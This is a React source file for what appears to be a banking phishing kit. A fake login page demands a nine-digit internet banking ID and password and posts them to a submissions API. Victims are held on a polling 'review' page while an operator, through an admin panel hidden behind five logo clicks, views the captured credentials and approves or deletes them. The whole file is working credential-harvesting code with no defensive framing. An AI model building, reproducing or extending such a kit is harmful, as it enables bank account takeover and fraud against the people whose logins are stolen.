/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, FormEvent, useEffect, useCallback } from 'react';
import { Submission } from './types';
import { LoginView } from './components/LoginView';
import { ReviewView } from './components/ReviewView';
import { AdminView } from './components/AdminView';

export default function App() {
  const [view, setView] = useState<'login' | 'review' | 'admin'>('login');
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [isApproved, setIsApproved] = useState(false);

  // Fetch submissions from API
  const fetchSubmissions = useCallback(async () => {
    try {
      const res = await fetch('/api/submissions');
      if (res.ok) {
        const data: Submission[] = await res.json();
        setSubmissions(data);
        return data;
      }
    } catch (e) {
      console.error('Failed to fetch submissions:', e);
    }
    return [];
  }, []);

  // Poll submissions in Admin view and load on initial mount
  useEffect(() => {
    fetchSubmissions();
  }, [fetchSubmissions]);

  useEffect(() => {
    if (view === 'admin') {
      fetchSubmissions();
      const interval = setInterval(fetchSubmissions, 4000);
      return () => clearInterval(interval);
    }
  }, [view, fetchSubmissions]);

  // Check approval status for Review page
  useEffect(() => {
    if (view === 'review') {
      const checkStatus = async () => {
        try {
          const res = await fetch('/api/submissions');
          if (!res.ok) return;
          const data: Submission[] = await res.json();
          setSubmissions(data);
          const mySub = data.find((s: Submission) => s.userId === username);
          if (mySub && mySub.status === 'Approved') {
            setIsApproved(true);
          }
        } catch (e) {
          console.error('Status check failed:', e);
        }
      };

      // Immediate check
      checkStatus();
      const interval = setInterval(checkStatus, 2500);
      return () => clearInterval(interval);
    } else {
      setIsApproved(false);
    }
  }, [view, username]);

  const handleLogin = async (e: FormEvent) => {
    e.preventDefault();
    setError(null);

    const isNineDigits = /^\d{9}$/.test(username.trim());
    if (!isNineDigits) {
      setError('Invalid Username. Please enter your 9-digit internet banking ID.');
      return;
    }

    if (!password.trim()) {
      setError('Password is required.');
      return;
    }

    setIsLoading(true);

    try {
      const res = await fetch('/api/submissions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: username.trim(), password })
      });
      
      if (res.ok) {
        await fetchSubmissions();
        setTimeout(() => {
          setIsLoading(false);
          setIsApproved(false);
          setView('review');
        }, 1200);
      } else {
        const errData = await res.json().catch(() => ({}));
        throw new Error(errData.error || 'Submission failed');
      }
    } catch (err: unknown) {
      setIsLoading(false);
      const errMsg = err instanceof Error ? err.message : 'Connection error. Please try again later.';
      setError(errMsg);
    }
  };

  const handleApprove = async (id: string) => {
    try {
      const res = await fetch(`/api/submissions/${id}/approve`, { method: 'POST' });
      if (res.ok) {
        await fetchSubmissions();
      }
    } catch (e) {
      console.error('Approval failed:', e);
    }
  };
  
  const handleDelete = async (id: string) => {
    try {
      const res = await fetch(`/api/submissions/${id}`, { method: 'DELETE' });
      if (res.ok) {
        await fetchSubmissions();
      }
    } catch (e) {
      console.error('Delete failed:', e);
    }
  };

  // Hidden Admin Access: Click the logo 5 times
  const [logoClicks, setLogoClicks] = useState(0);
  const handleLogoClick = () => {
    setLogoClicks(prev => {
      const next = prev + 1;
      if (next >= 5) {
        setView('admin');
        return 0;
      }
      return next;
    });
  };

  const pendingCount = submissions.filter(s => s.status === 'Pending Review').length;

  if (view === 'admin') {
    return (
      <AdminView
        submissions={submissions}
        onApprove={handleApprove}
        onDelete={handleDelete}
        onRefresh={fetchSubmissions}
        onLogout={() => setView('login')}
      />
    );
  }

  if (view === 'review') {
    return (
      <ReviewView
        userId={username}
        isApproved={isApproved}
        onContinue={() => {
          setView('login');
          setUsername('');
          setPassword('');
          setIsApproved(false);
        }}
        onCancel={() => {
          setView('login');
          setIsApproved(false);
        }}
      />
    );
  }

  return (
    <LoginView
      username={username}
      setUsername={setUsername}
      password={password}
      setPassword={setPassword}
      error={error}
      isLoading={isLoading}
      onLogin={handleLogin}
      onLogoClick={handleLogoClick}
      logoClicks={logoClicks}
      onSwitchToAdmin={() => setView('admin')}
      pendingCount={pendingCount}
    />
  );
}
